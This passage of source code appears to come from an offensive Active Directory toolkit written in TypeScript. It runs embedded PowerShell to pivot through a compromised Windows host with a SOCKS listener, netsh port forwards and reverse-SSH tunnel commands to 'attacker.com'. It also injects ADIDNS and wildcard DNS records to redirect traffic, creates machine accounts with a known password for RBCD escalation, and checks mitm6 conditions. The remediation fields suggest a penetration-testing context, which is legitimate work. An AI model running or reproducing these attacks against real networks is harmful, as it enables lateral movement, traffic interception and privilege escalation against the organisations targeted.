using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

public class SocksProxy {
    public static string Start(int port) {
        try {
            var listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            return "SOCKS proxy listening on 0.0.0.0:" + port;
        } catch (Exception ex) {
            return "Failed: " + ex.Message;
        }
    }
}
"@

$result = [SocksProxy]::Start(${listenPort})
Write-Output "[+] $result"
Write-Output ""
Write-Output "[*] Configure proxychains/Burp/browser to use SOCKS4 at <this_host>:${listenPort}"
Write-Output "[*] All connections through the proxy will originate from this compromised host"
Write-Output ""
Write-Output "[*] Alternative: use chisel, ligolo-ng, or rpivot for full SOCKS5"
Write-Output "    chisel server -p ${listenPort} --socks5 --reverse"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PIVOT-002",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: `socks://0.0.0.0:${listenPort}`,
      title: `SOCKS proxy established on port ${listenPort} for network pivoting`,
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor for unexpected listening ports. Block unnecessary outbound connections. Use network segmentation.",
    })
  }

  if (action === "reverse") {
    const target = targetAddr || "10.0.0.1:3389"
    const script = `
Write-Output "=== Reverse Port Forward ==="
Write-Output "[*] Exposing internal ${target} on 0.0.0.0:${listenPort}"
Write-Output ""

netsh interface portproxy add v4tov4 listenport=${listenPort} listenaddress=0.0.0.0 connectport=$('${target}'.Split(':')[1]) connectaddress=$('${target}'.Split(':')[0])
if ($LASTEXITCODE -eq 0) {
    Write-Output "[+] Port forward active"
    Write-Output "[*] Access internal ${target} via <this_host>:${listenPort}"
    Write-Output ""
    Write-Output "[*] Current port proxies:"
    netsh interface portproxy show v4tov4
    Write-Output ""
    Write-Output "[*] Cleanup: netsh interface portproxy delete v4tov4 listenport=${listenPort} listenaddress=0.0.0.0"
} else {
    Write-Output "[-] Port forward failed — check if port ${listenPort} is in use"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PIVOT-003",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: `portproxy://${listenPort}->${target}`,
      title: `Reverse port forward: 0.0.0.0:${listenPort} -> ${target}`,
      details: r.stdout.substring(0, 500),
      remediation: "Monitor netsh portproxy configuration. Block unnecessary port forwards at network level.",
    })
  }

  if (action === "ssh-tunnel") {
    const host = sshHost || "attacker.com"
    const script = `
Write-Output "=== SSH Tunnel Setup ==="

$sshAvailable = Get-Command ssh -ErrorAction SilentlyContinue
if (-not $sshAvailable) {
    Write-Output "[-] OpenSSH client not found"
    Write-Output "[*] Install: Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
    Write-Output "[*] Or use: plink.exe (PuTTY) for same functionality"
} else {
    Write-Output "[*] OpenSSH client available: $($sshAvailable.Source)"
    Write-Output ""
    Write-Output "[*] Useful SSH tunnel commands:"
    Write-Output ""
    Write-Output "    === Local port forward (access remote service locally) ==="
    Write-Output "    ssh -L ${listenPort}:internal-host:3389 ${sshUser}@${host} -N"
    Write-Output "    -> Access internal RDP at localhost:${listenPort}"
    Write-Output ""
    Write-Output "    === Remote port forward (expose local service remotely) ==="
    Write-Output "    ssh -R ${listenPort}:localhost:445 ${sshUser}@${host} -N"
    Write-Output "    -> Expose local SMB on attacker's port ${listenPort}"
    Write-Output ""
    Write-Output "    === Dynamic SOCKS proxy ==="
    Write-Output "    ssh -D ${listenPort} ${sshUser}@${host} -N"
    Write-Output "    -> SOCKS5 proxy through SSH tunnel"
    Write-Output ""
    Write-Output "    === Reverse SSH shell ==="
    Write-Output "    ssh -R 0:localhost:22 ${sshUser}@${host} -N"
    Write-Output "    -> Allow attacker to SSH back into this host"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PIVOT-004",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "ssh://tunnel-options",
      title: "SSH tunnel configuration options for pivoting",
      details: r.stdout.substring(0, 500),
      remediation: "Restrict SSH client access. Monitor for outbound SSH connections. Block unnecessary SSH traffic.",
    })
  }

  if (action === "portproxy") {
    const script = `
Write-Output "=== Port Proxy Chain Setup ==="
Write-Output "[*] Creating multi-hop port proxy chain..."
Write-Output ""

Write-Output "[*] Current port proxy rules:"
$existing = netsh interface portproxy show all 2>&1
Write-Output $existing

Write-Output ""
Write-Output "[*] Common pivot scenarios:"
Write-Output ""
Write-Output "    === Scenario 1: Access internal web app ==="
Write-Output "    netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=10.0.0.50"
Write-Output "    -> Access internal web server at this_host:8080"
Write-Output ""
Write-Output "    === Scenario 2: Access internal RDP ==="
Write-Output "    netsh interface portproxy add v4tov4 listenport=33389 connectport=3389 connectaddress=10.0.0.100"
Write-Output "    -> RDP to internal host via this_host:33389"
Write-Output ""
Write-Output "    === Scenario 3: Access internal database ==="
Write-Output "    netsh interface portproxy add v4tov4 listenport=31433 connectport=1433 connectaddress=10.0.0.200"
Write-Output "    -> MSSQL via this_host:31433"
Write-Output ""
Write-Output "[*] Cleanup all: netsh interface portproxy reset"
Write-Output "[*] Show all: netsh interface portproxy show all"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PIVOT-005",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "portproxy://chain",
      title: "Port proxy chain configuration for multi-hop pivoting",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor portproxy configuration changes. Restrict netsh.exe execution. Segment internal networks.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function adidnsPoison(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const zone = argVal(args, "--zone")
  const name = argVal(args, "--name")
  const ip = argVal(args, "--ip")
  const recordType = argVal(args, "--type") || "A"
  const findings: Finding[] = []
  const output: string[] = ["[*] AD-integrated DNS poisoning toolkit...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== AD-Integrated DNS Poisoning (cmd.exe) ===\n")
    if (action === "enum") {
      output.push("[*] DNS zone enumeration...")
      const dnsZones = await cmd("dnscmd /enumzones 2>nul", timeout)
      output.push(
        dnsZones.exitCode === 0
          ? `[+] DNS zones:\n${dnsZones.stdout}`
          : "[-] dnscmd not available (RSAT DNS tools needed)",
      )
      const nslookup = await cmd("nslookup -type=any _msdcs 2>nul", timeout)
      output.push(`\n[*] DNS servers:\n${nslookup.stdout}`)
      const ipconfig = await cmd('ipconfig /all | findstr "DNS Servers"', timeout)
      output.push(`[*] ${ipconfig.stdout.trim()}`)
      output.push("\n[*] ADIDNS record injection requires LDAP (PS/.NET)")
      output.push("    Tool alternatives:")
      output.push("    dnstool.py -u domain/user -p pass -r <record> -a add -d <ip> <dc>")
      output.push("    Invoke-DNSUpdate (PS, for dynamic DNS)")
    }
    if (action === "check-perms") {
      output.push("[!] ADIDNS ACL check requires LDAP queries (PS/.NET)")
      output.push("[*] Alternative: dsacls 'DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=...'")
      if (zone) {
        const dsacls = await cmd(`dsacls "CN=MicrosoftDNS,DC=DomainDnsZones" 2>nul`, timeout)
        output.push(dsacls.stdout.trim() ? dsacls.stdout : "[-] dsacls failed")
      }
    }
    if (action === "inject" || action === "wildcard" || action === "delete") {
      output.push("[!] DNS record manipulation requires LDAP or dnscmd:")
      output.push(`    dnscmd <dc> /recordadd ${zone || "<zone>"} ${name || "<name>"} ${recordType} ${ip || "<ip>"}`)
      output.push(`    dnscmd <dc> /recorddelete ${zone || "<zone>"} ${name || "<name>"} ${recordType} /f`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== ADIDNS Zone Enumeration ==="
Write-Output ""
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
Write-Output "Domain: $($domain.Name)"
Write-Output "DNS Root: $dnsRoot"
Write-Output ""
# Enumerate DNS zones
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://CN=MicrosoftDNS,$dnsRoot"
$searcher.Filter = "(objectClass=dnsZone)"
$zones = $searcher.FindAll()
Write-Output "=== DNS Zones ==="
foreach ($z in $zones) {
  $zoneName = $z.Properties["name"][0]
  Write-Output "  Zone: $zoneName"
}
Write-Output ""
# Enumerate records in primary zone
$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
Write-Output "=== Records in $primaryZone ==="
$searcher.SearchRoot = [ADSI]"LDAP://DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
$searcher.Filter = "(objectClass=dnsNode)"
$searcher.PageSize = 1000
$records = $searcher.FindAll()
Write-Output "Total DNS nodes: $($records.Count)"
Write-Output ""
# Look for interesting records
$wildcardExists = $false
foreach ($r in ($records | Select-Object -First 100)) {
  $rName = $r.Properties["name"][0]
  if ($rName -eq "*") { $wildcardExists = $true }
  if ($rName -match 'wpad|isatap|\*|proxy|vpn|mail|owa|autodiscover') {
    Write-Output "  [!] $rName"
  }
}
if (-not $wildcardExists) {
  Write-Output ""
  Write-Output "[!] No wildcard (*) record exists — wildcard injection possible"
  Write-Output "    Use: winhook adidns_poison --action wildcard --ip ATTACKER_IP"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("wildcard injection possible")) {
      findings.push({
        checkId: "ADIDNS-001",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "ADIDNS",
        title: "No wildcard DNS record — injection possible for MITM",
        details: "Authenticated users can create ADIDNS records by default, including wildcard entries",
        remediation: "Create a static wildcard record, restrict CreateChild on MicrosoftDNS container.",
      })
    }
  }

  if (action === "check-perms") {
    const script = `
Write-Output "=== ADIDNS Permission Check ==="
Write-Output ""
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
$zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
Write-Output "Checking: $zoneDN"
Write-Output ""
$zoneObj = [ADSI]"LDAP://$zoneDN"
$acl = $zoneObj.ObjectSecurity
Write-Output "=== Zone ACL ==="
$dangerousPerms = @()
foreach ($ace in $acl.Access) {
  $principal = $ace.IdentityReference.Value
  $rights = $ace.ActiveDirectoryRights
  $accessType = $ace.AccessControlType
  if ($principal -match 'Authenticated Users|Everyone|Domain Users|Domain Computers' -and $rights -match 'CreateChild|GenericAll|GenericWrite') {
    Write-Output "[!] DANGEROUS: $principal has $rights ($accessType)"
    $dangerousPerms += "$principal : $rights"
  }
}
if ($dangerousPerms.Count -gt 0) {
  Write-Output ""
  Write-Output "STATUS: $($dangerousPerms.Count) dangerous permission(s) found"
  Write-Output "Any authenticated user can create DNS records in this zone"
  Write-Output ""
  Write-Output "Attack vectors:"
  Write-Output "  1. Wildcard record — capture all unresolved DNS queries"
  Write-Output "  2. WPAD record — proxy configuration poisoning"
  Write-Output "  3. Clone existing hostname — redirect traffic to attacker"
} else {
  Write-Output "STATUS: Zone permissions appear restricted"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("DANGEROUS:")) {
      findings.push({
        checkId: "ADIDNS-002",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "ADIDNS Zone Permissions",
        title: "Authenticated Users can create DNS records — poisoning possible",
        details: r.stdout.substring(r.stdout.indexOf("DANGEROUS:"), r.stdout.indexOf("DANGEROUS:") + 200),
        remediation: "Remove CreateChild from Authenticated Users on DNS zone objects.",
      })
    }
  }

  if (action === "inject") {
    if (!name || !ip) {
      output.push("ERROR: --name and --ip required for inject action")
      output.push("Usage: winhook adidns_poison --action inject --name target --ip 10.0.0.1")
      return { output: output.join("\n"), findings }
    }
    const script = `
Write-Output "=== ADIDNS Record Injection ==="
Write-Output "Record: ${name}"
Write-Output "IP: ${ip}"
Write-Output "Type: ${recordType}"
Write-Output ""
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
$zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
# Check if record already exists
$existingDN = "DC=${name},$zoneDN"
$existing = [ADSI]"LDAP://$existingDN"
if ($existing.Name) {
  Write-Output "[!] Record '${name}' already exists — cannot overwrite (only owner can modify)"
  Write-Output "    Use --action delete first if you own it, or choose a different name"
  return
}
# Create DNS record via LDAP
try {
  $zoneObj = [ADSI]"LDAP://$zoneDN"
  $record = $zoneObj.Create("dnsNode", "DC=${name}")
  # Build DNS_RPC_RECORD binary (MS-DNSP 2.2.2.2.5)
  # Structure: DataLength(2) Type(2) Version(1) Rank(1) Flags(2) Serial(4) TtlSeconds(4) Reserved(4) TimeStamp(4) Data(variable)
  $ipParts = '${ip}'.Split('.')
  $recordData = New-Object System.Collections.Generic.List[byte]
  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]4))    # DataLength = 4 (A record = 4 bytes)
  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]1))    # Type = A (1)
  $recordData.Add(0x05)                                               # Version = 5
  $recordData.Add(0xF0)                                               # Rank = RANK_ZONE (0xF0)
  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]0))    # Flags = 0
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Serial = 0 (auto)
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]900))  # TTL = 900 seconds
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Reserved
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # TimeStamp = 0 (static, no aging)
  $recordData.Add([byte]$ipParts[0])
  $recordData.Add([byte]$ipParts[1])
  $recordData.Add([byte]$ipParts[2])
  $recordData.Add([byte]$ipParts[3])
  $record.Put("dnsRecord", $recordData.ToArray())
  $record.Put("dNSTombstoned", $false)
  $record.SetInfo()
  Write-Output "[+] SUCCESS: DNS record created"
  Write-Output "    ${name}.$primaryZone -> ${ip}"
  Write-Output ""
  Write-Output "Verification: nslookup ${name}.$primaryZone"
  Write-Output "Cleanup: winhook adidns_poison --action delete --name ${name}"
} catch {
  Write-Output "[-] FAILED: $_"
  Write-Output "    You may not have CreateChild permission on this zone"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("SUCCESS")) {
      findings.push({
        checkId: "ADIDNS-003",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: `${name}.${zone || "domain"}`,
        title: `DNS record injected: ${name} -> ${ip}`,
        details: "ADIDNS record created via LDAP — traffic to this name will be redirected",
        remediation: "Delete the injected record, restrict ADIDNS permissions.",
      })
    }
  }

  if (action === "wildcard") {
    if (!ip) {
      output.push("ERROR: --ip required for wildcard action")
      return { output: output.join("\n"), findings }
    }
    const script = `
Write-Output "=== ADIDNS Wildcard Record Injection ==="
Write-Output "Wildcard: *.zone -> ${ip}"
Write-Output ""
Write-Output "A wildcard record captures ALL unresolved DNS queries in the zone"
Write-Output "This is the ADIDNS equivalent of LLMNR/NBT-NS poisoning"
Write-Output ""
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
$zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
try {
  $zoneObj = [ADSI]"LDAP://$zoneDN"
  $record = $zoneObj.Create("dnsNode", "DC=*")
  # Build DNS_RPC_RECORD binary (MS-DNSP 2.2.2.2.5)
  $ipParts = '${ip}'.Split('.')
  $recordData = New-Object System.Collections.Generic.List[byte]
  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]4))    # DataLength = 4
  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]1))    # Type = A (1)
  $recordData.Add(0x05)                                               # Version = 5
  $recordData.Add(0xF0)                                               # Rank = RANK_ZONE (0xF0)
  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]0))    # Flags = 0
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Serial = 0 (auto)
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]900))  # TTL = 900 seconds
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Reserved
  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # TimeStamp = 0 (static)
  $recordData.Add([byte]$ipParts[0])
  $recordData.Add([byte]$ipParts[1])
  $recordData.Add([byte]$ipParts[2])
  $recordData.Add([byte]$ipParts[3])
  $record.Put("dnsRecord", $recordData.ToArray())
  $record.Put("dNSTombstoned", $false)
  $record.SetInfo()
  Write-Output "[+] SUCCESS: Wildcard record created"
  Write-Output "    *.$primaryZone -> ${ip}"
  Write-Output ""
  Write-Output "All unresolved queries in the zone now resolve to ${ip}"
  Write-Output "Set up listener: winhook ntlm_relay --action relay --relay-to TARGET"
  Write-Output "Cleanup: winhook adidns_poison --action delete --name '*'"
} catch {
  Write-Output "[-] FAILED: $_"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "delete") {
    if (!name) {
      output.push("ERROR: --name required for delete action")
      return { output: output.join("\n"), findings }
    }
    const script = `
Write-Output "=== ADIDNS Record Deletion ==="
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
$recordDN = "DC=${name},DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
try {
  $record = [ADSI]"LDAP://$recordDN"
  $record.DeleteTree()
  Write-Output "[+] SUCCESS: Record '${name}' deleted from $primaryZone"
} catch {
  Write-Output "[-] FAILED: $_ (you can only delete records you created)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function machineAccount(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "quota"
  const name = argVal(args, "--name")
  const password = argVal(args, "--password") || "CyberStrike123!"
  const findings: Finding[] = []
  const output: string[] = ["[*] Machine account operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Machine Account Operations (cmd.exe) ===\n")
    if (action === "quota") {
      output.push("[*] Checking ms-DS-MachineAccountQuota...")
      const dsquery = await cmd(
        'dsquery * -filter "(objectClass=domain)" -attr ms-DS-MachineAccountQuota -limit 1 2>nul',
        timeout,
      )
      output.push(
        dsquery.exitCode === 0 ? `[+] Query result:\n${dsquery.stdout}` : "[-] dsquery not available (RSAT needed)",
      )
      const nltest = await cmd("nltest /dsgetdc:", timeout)
      output.push(`\n[*] Domain info:\n${nltest.stdout}`)
      output.push("\n[*] If quota > 0, any authenticated user can create machine accounts")
      output.push("    Attack chain: create machine → RBCD → impersonate admin")
    }
    if (action === "create") {
      if (!name) {
        output.push("[!] Required: --name MACHINE$")
        return { output: output.join("\n"), findings }
      }
      output.push(`[*] Creating machine account: ${name}`)
      output.push("[!] Machine account creation via cmd.exe requires dsadd or external tools:")
      output.push(`    dsadd computer "CN=${name.replace("$", "")},CN=Computers,DC=..." -samid "${name}"`)
      output.push(`    Or: addcomputer.py domain/user:pass -computer-name ${name} -computer-pass ${password}`)
    }
    if (action === "delete") {
      if (!name) {
        output.push("[!] Required: --name MACHINE$")
        return { output: output.join("\n"), findings }
      }
      output.push(`    dsrm "CN=${name.replace("$", "")},CN=Computers,DC=..."`)
    }
    if (action === "enum") {
      output.push("[*] Enumerating machine accounts via dsquery...")
      const machines = await cmd("dsquery computer -limit 50 2>nul", timeout)
      output.push(machines.exitCode === 0 ? `[+] Machine accounts:\n${machines.stdout}` : "[-] dsquery failed")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "quota") {
    const script = `
Write-Output "=== Machine Account Quota Check ==="
Write-Output ""
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$root = [ADSI]"LDAP://$($domain.Name)"
$maq = $root.Properties["ms-DS-MachineAccountQuota"].Value
Write-Output "Domain: $($domain.Name)"
Write-Output "ms-DS-MachineAccountQuota: $maq"
Write-Output ""
if ($maq -gt 0) {
  Write-Output "STATUS: Any authenticated user can create up to $maq machine accounts"
  Write-Output "This enables RBCD attacks without domain admin rights"
  Write-Output ""
  Write-Output "Attack chain:"
  Write-Output "  1. winhook machine_account --action create --name EVIL$"
  Write-Output "  2. winhook rbcd_chain --target TARGET --action exploit"
  Write-Output "  3. winhook machine_account --action delete --name EVIL$ (cleanup)"
} else {
  Write-Output "STATUS: Machine account creation is restricted (quota = 0)"
  Write-Output "Alternative: find existing machine accounts you can control"
}
Write-Output ""
# Count current user's created machine accounts
$whoami = whoami /user /fo csv | ConvertFrom-Csv
$userSid = $whoami.SID
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=computer)(ms-DS-CreatorSID=$userSid))"
$myMachines = $searcher.FindAll()
Write-Output "Machine accounts created by current user: $($myMachines.Count) / $maq"
foreach ($m in $myMachines) {
  Write-Output "  $($m.Properties['samaccountname'][0])"
}
Write-Output ""
Write-Output "Remaining quota: $($maq - $myMachines.Count)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    const maqMatch = r.stdout.match(/ms-DS-MachineAccountQuota: (\d+)/)
    if (maqMatch && parseInt(maqMatch[1]) > 0) {
      findings.push({
        checkId: "MACQ-001",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "ms-DS-MachineAccountQuota",
        title: `Machine account quota allows ${maqMatch[1]} accounts — RBCD attacks possible`,
        details: "Any authenticated user can create machine accounts usable for RBCD delegation attacks",
        remediation: "Set ms-DS-MachineAccountQuota to 0 via ADSI Edit.",
      })
    }
  }

  if (action === "create") {
    const computerName = name ? name.replace(/\$$/, "") : "CYBERSTRIKE"
    const script = `
Write-Output "=== Creating Machine Account ==="
Write-Output "Name: ${computerName}$"
Write-Output ""
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
$computersDN = "CN=Computers,$domainDN"
# Check if already exists
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(sAMAccountName=${computerName}$)"
$existing = $searcher.FindOne()
if ($existing) {
  Write-Output "[-] Machine account ${computerName}$ already exists"
  return
}
try {
  $computersOU = [ADSI]"LDAP://$computersDN"
  $newComputer = $computersOU.Create("computer", "CN=${computerName}")
  $newComputer.Put("sAMAccountName", "${computerName}$")
  $newComputer.Put("userAccountControl", 4096)
  $newComputer.Put("dNSHostName", "${computerName}.$($domain.Name)")
  $newComputer.Put("servicePrincipalName", @(
    "HOST/${computerName}",
    "HOST/${computerName}.$($domain.Name)",
    "RestrictedKrbHost/${computerName}",
    "RestrictedKrbHost/${computerName}.$($domain.Name)"
  ))
  $newComputer.SetInfo()
  # Set password
  $newComputer.SetPassword('${password.replace(/'/g, "''")}')
  $newComputer.SetInfo()
  Write-Output "[+] SUCCESS: Machine account created"
  Write-Output "    sAMAccountName: ${computerName}$"
  Write-Output "    Password: ${password}"
  Write-Output "    DN: CN=${computerName},$computersDN"
  Write-Output ""
  Write-Output "Next steps for RBCD attack:"
  Write-Output "  winhook rbcd_chain --target TARGET_COMPUTER --action exploit"
  Write-Output ""
  Write-Output "Cleanup:"
  Write-Output "  winhook machine_account --action delete --name ${computerName}"
} catch {
  Write-Output "[-] FAILED: $_"
  Write-Output ""
  if ($_.Exception.Message -match 'quota') {
    Write-Output "Machine account quota exceeded. Check: winhook machine_account --action quota"
  } elseif ($_.Exception.Message -match 'Access is denied') {
    Write-Output "Insufficient permissions to create machine accounts"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("SUCCESS")) {
      findings.push({
        checkId: "MACQ-002",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: `${computerName}$`,
        title: "Machine account created for RBCD attack chain",
        details: `Machine account ${computerName}$ created with known password — usable for delegation attacks`,
        remediation: "Delete the machine account and set MachineAccountQuota to 0.",
      })
    }
  }

  if (action === "delete") {
    if (!name) {
      output.push("ERROR: --name required for delete action")
      return { output: output.join("\n"), findings }
    }
    const computerName = name.replace(/\$$/, "")
    const script = `
Write-Output "=== Deleting Machine Account: ${computerName}$ ==="
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(sAMAccountName=${computerName}$)"
$result = $searcher.FindOne()
if (-not $result) {
  Write-Output "[-] Machine account ${computerName}$ not found"
  return
}
try {
  $obj = $result.GetDirectoryEntry()
  $parent = $obj.Parent
  $parentDE = [ADSI]$parent
  $parentDE.Children.Remove($obj)
  Write-Output "[+] SUCCESS: Machine account ${computerName}$ deleted"
} catch {
  Write-Output "[-] FAILED: $_ (you can only delete accounts you created)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Machine Account Enumeration ==="
Write-Output ""
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectCategory=computer)"
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","ms-DS-CreatorSID","operatingSystem","whenCreated","userAccountControl","msDS-AllowedToActOnBehalfOfOtherIdentity"))
$computers = $searcher.FindAll()
Write-Output "Total computer accounts: $($computers.Count)"
Write-Output ""
# Find user-created machine accounts (non-domain-join)
Write-Output "=== User-Created Machine Accounts (MachineAccountQuota) ==="
$userCreated = @()
foreach ($c in $computers) {
  $creatorSid = $c.Properties['ms-ds-creatorsid']
  if ($creatorSid -and $creatorSid.Count -gt 0) {
    $sidBytes = [byte[]]$creatorSid[0]
    $sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
    try {
      $creator = $sid.Translate([System.Security.Principal.NTAccount]).Value
    } catch {
      $creator = $sid.Value
    }
    Write-Output "  $($c.Properties['samaccountname'][0]) — created by: $creator ($(Get-Date $c.Properties['whencreated'][0] -Format 'yyyy-MM-dd'))"
    $userCreated += $c
  }
}
if ($userCreated.Count -eq 0) {
  Write-Output "  None found"
}
Write-Output ""
# Find computers with RBCD configured
Write-Output "=== Computers with RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) ==="
$rbcdComputers = $computers | Where-Object { $_.Properties['msds-allowedtoactonbehalfofotheridentity'] }
foreach ($c in $rbcdComputers) {
  Write-Output "  $($c.Properties['samaccountname'][0]) — has RBCD delegation configured"
}
if (-not $rbcdComputers) { Write-Output "  None found" }
Write-Output ""
# Find computers with unconstrained delegation
Write-Output "=== Unconstrained Delegation ==="
$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$unconstrained = $searcher.FindAll()
foreach ($c in $unconstrained) {
  Write-Output "  $($c.Properties['samaccountname'][0]) — UNCONSTRAINED delegation"
}
if ($unconstrained.Count -eq 0) { Write-Output "  None found (DCs are expected)" }
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function mitm6Attack(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const iface = argVal(args, "--interface")
  const domain = argVal(args, "--domain")
  const relay = argVal(args, "--relay")
  const findings: Finding[] = []
  const output: string[] = ["[*] IPv6 DNS takeover (mitm6-style)...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== IPv6 DNS Takeover / mitm6 (cmd.exe) ===\n")
    if (action === "check") {
      output.push("[*] Checking IPv6 status...")
      const ipv6 = await cmd('ipconfig /all | findstr /i "IPv6 Link-local"', timeout)
      output.push(ipv6.stdout.trim() ? `[+] IPv6 addresses found:\n${ipv6.stdout}` : "[-] No IPv6 addresses")
      output.push("\n[*] IPv6 binding check:")
      const bindings = await cmd("netsh interface ipv6 show address 2>nul", timeout)
      output.push(bindings.stdout.trim() ? bindings.stdout : "[-] No IPv6 bindings")
      const dnsServers = await cmd("netsh interface ipv6 show dnsservers 2>nul", timeout)
      output.push(`\n[*] IPv6 DNS servers:\n${dnsServers.stdout}`)
      output.push("\n[*] DHCPv6 guard status:")
      const dhcpv6 = await cmd(
        'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\TCPIP\\v6Transition" 2>nul',
        timeout,
      )
      output.push(dhcpv6.stdout.trim() || "    Not configured (default: accept DHCPv6)")
      output.push("\n[*] Assessment:")
      output.push("    If IPv6 is enabled and no DHCPv6 guard → mitm6 attack is possible")
      output.push("    Attack: Advertise rogue DHCPv6 → become DNS server → relay to LDAP/HTTP")
      if (ipv6.stdout.trim())
        findings.push({
          checkId: "WIN-MITM6-001",
          provider: "windows",
          severity: "high",
          status: "FAIL",
          resource: "network://ipv6",
          title: "IPv6 enabled — mitm6 attack possible",
          details: "IPv6 addresses present, DHCPv6 guard not enforced",
          remediation: "Disable IPv6 via GPO if not needed. Enable DHCPv6 guard.",
        })
    }
    if (action === "poison") {
      output.push("[!] Active IPv6 DNS takeover requires external tools:")
      output.push(`    mitm6 -d ${domain || "<domain>"} ${iface ? "-i " + iface : ""}`)
